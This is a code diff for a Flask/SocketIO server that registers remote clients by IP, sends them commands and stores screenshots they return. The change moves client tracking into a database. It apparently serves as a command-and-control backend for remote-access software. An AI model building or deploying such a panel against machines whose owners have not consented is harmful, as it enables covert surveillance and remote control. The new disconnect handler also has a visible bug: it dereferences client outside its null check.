@@ -1,22 +1,35 @@
 import base64
-from datetime import datetime
-from flask import Flask, request, jsonify, send_from_directory
-from flask_socketio import SocketIO
 import os
+from datetime import datetime
+
+from flask import Flask, request, jsonify, send_from_directory
+from flask_migrate import Migrate
+from flask_socketio import SocketIO
+
+from config.config import Config
+from config.extensions import db
 
 app = Flask(__name__)
+app.config.from_object(Config)
+db.init_app(app)
+migrate = Migrate(app, db)
+
+# Models
+from models import Client
+
 socketio = SocketIO(app)
 clients = {}
 
 
 def emit_command_to_client(ip, command):
-    if clients[ip]['status'] == 'online':
-        socketio.emit('command', {'command': command}, room=clients[ip]['sid'])
+    client = Client.query.filter_by(ip=ip).first()
+    if client and client.status == 'online':
+        socketio.emit('command', {'command': command}, room=client.sid)
         return jsonify({'status': 'success', 'message': f'Command {command} sent to client {ip}.'}), 200
-    elif clients[ip]['status'] == 'offline':
+    elif client and client.status == 'offline':
         return jsonify({'status': 'error', 'message': f'**🔴 Client {ip} is offline.**'}), 200
     else:
-        return jsonify({'status': 'error', 'message': f'Client {ip} not found.'}), 200
+        return jsonify({'status': 'error', 'message': 'Client not found.'}), 200
 
 
 @app.route('/api/v1/command', methods=['POST'])
@@ -34,12 +47,14 @@ def handle_command():
 def get_clients():
     status_filter = request.args.get('status')
     if status_filter:
-        filtered_clients = {ip: data for ip, data in clients.items() if data['status'] == status_filter}
+        clients = Client.query.filter_by(status=status_filter).all()
     else:
-        filtered_clients = clients
+        clients = Client.query.all()
 
-    clients_info = [{'name': f'Client {i + 1}', 'ip': ip, 'status': data['status']}
-                    for i, (ip, data) in enumerate(filtered_clients.items())]
+    clients_info = [{'name': f'Client {client.id}', 'ip': client.ip, 'status': client.status,
+                     'date_created': client.date_created.strftime('%d/%m/%Y at %H:%M:%S'),
+                     'date_updated': client.date_updated.strftime('%d/%m/%Y at %H:%M:%S')}
+                    for client in clients]
     return jsonify({'status': 'success', 'clients': clients_info}), 200
 
 
@@ -76,38 +91,44 @@ def get_screenshot(ip, screenshot):
 @socketio.on('connect')
 def handle_connect():
     client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
-    clients[client_ip] = {'sid': request.sid, 'status': 'online'}
+    sid = request.sid
+    client = Client.query.filter_by(ip=client_ip).first()
+    if client:
+        client.status = 'online'
+        client.sid = sid
+        client.date_updated = datetime.now()
+    else:
+        client = Client(ip=client_ip, status='online', sid=sid, date_created=datetime.now())
+        db.session.add(client)
+    db.session.commit()
     print(f"Client {client_ip} connected and is now online.")
 
 
 @socketio.on('screenshot_response')
 def handle_screenshot(data):
     screenshot_bytes = base64.b64decode(data.get('screenshot'))
-    client_ip = None
-    for ip, client_data in clients.items():
-        if client_data['sid'] == request.sid:
-            client_ip = ip
-            break
-    if not client_ip:
+    sid = request.sid
+    client = Client.query.filter_by(sid=sid).first()
+    if client:
+        client_ip = client.ip
+        screenshot_dir = f"screenshots/{client_ip}"
+        os.makedirs(screenshot_dir, exist_ok=True)
+        screenshot_path = f"{screenshot_dir}/{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.png"
+        with open(screenshot_path, 'wb') as f:
+            f.write(screenshot_bytes)
+    else:
         print("Client not found.")
-        return
-    screenshot_dir = f"screenshots/{client_ip}"
-    os.makedirs(screenshot_dir, exist_ok=True)
-    screenshot_path = f"{screenshot_dir}/{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.png"
-    with open(screenshot_path, 'wb') as f:
-        f.write(screenshot_bytes)
 
 
 @socketio.on('disconnect')
 def handle_disconnect():
-    client_ip = None
-    for ip, data in clients.items():
-        if data['sid'] == request.sid:
-            client_ip = ip
-            break
-    if client_ip:
-        clients[client_ip]['status'] = 'offline'
-        print(f"Client {client_ip} disconnected and is now offline.")
+    sid = request.sid
+    client = Client.query.filter_by(sid=sid).first()
+    if client:
+        client.status = 'offline'
+        client.date_updated = datetime.now()
+        db.session.commit()
+    print(f"Client {client.ip} disconnected and is now offline.")
 
 
 if __name__ == '__main__':
